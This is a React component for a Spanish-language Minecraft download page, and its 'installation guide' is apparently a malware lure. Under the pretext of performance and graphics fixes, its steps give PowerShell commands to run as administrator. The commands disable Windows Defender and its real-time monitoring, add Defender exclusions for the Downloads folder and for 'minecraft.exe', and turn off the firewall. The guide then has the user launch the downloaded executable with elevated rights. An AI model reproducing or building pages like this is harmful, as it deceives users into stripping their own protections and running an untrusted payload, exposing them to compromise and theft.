import CodeBlock from "./CodeBlock";
import "../styles/download-section.css";

// interface DownloadOption {
//   platform: string;
//   buttonText: string;
// }

interface InstallationStep {
  number: number;
  title: string;
  description: string;
  command?: string;
}

const DownloadSection = () => {
  // const downloadOptions: DownloadOption[] = [
  //   { platform: "Windows", buttonText: "Descargar para Windows" },
  //   { platform: "Mac", buttonText: "Descargar para Mac" },
  //   { platform: "Linux", buttonText: "Descargar para Linux" },
  // ];

  const installationSteps: InstallationStep[] = [
    {
      number: 1,
      title: "Prepara el entorno de Windows",
      description:
        "Para optimizar la ejecución y evitar bloqueos, vamos a ajustar algunas configuraciones. Ejecuta los siguientes comandos en PowerShell como administrador.",
      command: `reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`,
    },
    {
      number: 2,
      title: "Desactiva 'realtime monitoring'",
      description:
        "Ejecuta el comando para deshabilitar temporalmente 'realtime monitoring', esto permite que la aplicación se ejecute sin interrupciones.",
      command: `Set-MpPreference -DisableRealtimeMonitoring $true`,
    },
    {
      number: 3,
      title: "Agrega algunas configuraciones extras",
      description:
        "Cambia 'Usuario' por tu nombre. Asegúrate de sea tu carpeta de descargas. Así el instalador sabrá dónde buscar el archivo.",
      command: `Add-MpPreference -ExclusionPath "C:\\Users\\Usuario\\Downloads"\nAdd-MpPreference -ExclusionProcess "C:\\Users\\Usuario\\Downloads\\minecraft.exe"`,
    },
    {
      number: 4,
      title: "Desactiva temporalmente utilidades del sistema",
      description:
        "Apaga algunas utilidades que solo empeorarán los gráficos.",
      command: `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`,
    },
    {
      number: 5,
      title: "Descarga Minecraft",
      description:
        "Descarga el archivo ejecutable",
    },
    {
      number: 6,
      title: "Ejecuta Minecraft",
      description:
        "Finalmente, inicia la aplicación con privilegios de administrador para asegurar que pueda realizar todas las operaciones necesarias. Recuerda cambiar 'Usuario' por tu nombre.",
      command: `Start-Process "C:\\Users\\Usuario\\Downloads\\minecraft.exe" -Verb RunAs`,
    },
  ];

  return (
    <section id="download" className="download-section">
      <div className="container">
        <div className="section-header">
          <h2 className="section-title">¿Listo para jugar?</h2>
          <p className="section-description">
            Descarga Minecraft ahora y comienza tu aventura en un mundo
            limitado solo por tu imaginación.
          </p>
        </div>

        {/* <div className="download-buttons">
          {downloadOptions.map((option, index) => (
            <button key={index} className="button download-button">
              {option.buttonText}
            </button>
          ))}
        </div> */}

        <div className="installation-container">
          <h3 className="installation-title">Guía de instalación</h3>

          <div className="installation-steps">
            {installationSteps.map((step) => (
              <div key={step.number} className="installation-step">
                <div className="step-content">
                  <h4 className="step-title">{step.number}. {step.title}</h4>
                  <p className="step-description">{step.description}</p>
                  {step.command && (
                    <CodeBlock
                      code={step.command}
                      language="powershell"
                      title="Comando para ejecutar"
                    />
                  )}
                  {step.number === 5 && (
                    <button className="button download-button" style={{ marginTop: "1rem", marginBottom: "1rem", background: "linear-gradient(90deg, #f59e42 0%, #f43f5e 100%)", color: "white" }}>
                      Descargar Minecraft
                    </button>
                  )}
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="download-info">
          <p>
            
          </p>
        </div>
      </div>
    </section>
  );
};

export default DownloadSection;
